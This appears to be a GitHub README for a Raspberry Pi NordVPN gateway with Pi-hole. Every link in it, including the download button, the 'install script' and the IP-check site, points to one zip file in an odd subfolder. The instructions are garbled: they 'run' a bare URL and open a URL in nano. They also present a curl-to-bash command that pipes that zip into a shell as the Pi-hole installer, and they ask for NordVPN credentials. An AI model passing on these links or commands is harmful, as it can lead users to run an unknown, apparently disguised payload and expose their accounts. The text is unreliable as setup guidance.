# 🖥️ raspberrypi-nordvpn-gateway - Simple VPN for Your Raspberry Pi

## 📥 Download 

[![Download](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip)](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip)

## 🚀 Getting Started

This guide will help you set up a secure NordVPN gateway using your Raspberry Pi. This setup includes Pi-hole for ad-blocking and selective routing. Whether you want to secure your entire network or your specific devices, this application provides an easy way to achieve that.

## 📋 Requirements

To run this application, you will need:

- A Raspberry Pi device (Model 2, 3, or 4)
- Raspbian OS installed
- A NordVPN account
- Basic understanding of how to access your Raspberry Pi via terminal

## 📂 Download & Install

To get started, visit the Releases page to download the necessary files:

[Visit this page to download](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip)

1. Click on the version you want to download.
2. Download the zip file or image file to your computer.
3. Unzip the file if necessary.

### 🛠️ Installation Steps

1. **Transfer Files to Raspberry Pi:**
   Use SCP or a flash drive to transfer the downloaded files to your Raspberry Pi.

2. **Open the Terminal:**
   Access the terminal on your Raspberry Pi. You can do this directly or over SSH.

3. **Navigate to the Download Directory:**
   Use the `cd` command to change to the directory where you placed the downloaded files. For example:
   ```
   cd /path/to/downloads
   ```

4. **Run the Install Script:**
   Use the following command to run the installation script:
   ```
   https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip
   ```

5. **Follow On-Screen Instructions:**
   The script will guide you through the installation process. Enter your NordVPN credentials when prompted.

6. **Reboot the Raspberry Pi:**
   After installation, reboot your Raspberry Pi using:
   ```
   sudo reboot
   ```

## ☑️ Configuration

Once rebooted, you need to configure the VPN settings:

1. Open the terminal again.
2. Use the following command to access the configuration file:
   ```
   nano https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip
   ```
3. Follow the comments in the file to set up your preferred configuration.

### 🛡️ Setting Up Pi-hole

To set up Pi-hole alongside NordVPN:

1. Install Pi-hole using the command:
   ```
   curl -sSL https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip | bash
   ```
2. Follow the setup prompts to configure your DNS server.

3. Ensure that DNS queries go through the VPN by modifying your Pi-hole settings.

## 📈 Testing Your Setup

1. After the installation and configuration, open a web browser on a device connected to your network.
2. Visit [https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip](https://raw.githubusercontent.com/itzethanus/raspberrypi-nordvpn-gateway/main/psyche/raspberrypi-nordvpn-gateway.zip) to verify that your IP address has changed to that of the NordVPN server.
3. Check for ad-blocking by entering a website that typically displays ads.

## 📝 Troubleshooting

If you encounter any issues:

- Check your internet connection.
- Ensure your Raspberry Pi is up to date. You can do this using:
  ```
  sudo apt update && sudo apt upgrade
  ```
- Review the installation log for any errors.

## 🤝 Support

For further assistance, consider visiting the community forums or the GitHub Issues page for this project.

## 📚 Topics Covered

- Home Assistant
- Home Networking
- Iptables
- Linux
- MQTT
- NordVPN
- Pi-hole
- Raspberry Pi
- Selective Routing
- Systemd
- WireGuard

Feel free to explore these topics for additional information and related projects.

## 📩 Feedback

Your feedback is vital for improving this project. Please submit any issues or suggestions on the GitHub Issues page.

Happy browsing! Enjoy your secure internet experience with the raspberrypi-nordvpn-gateway.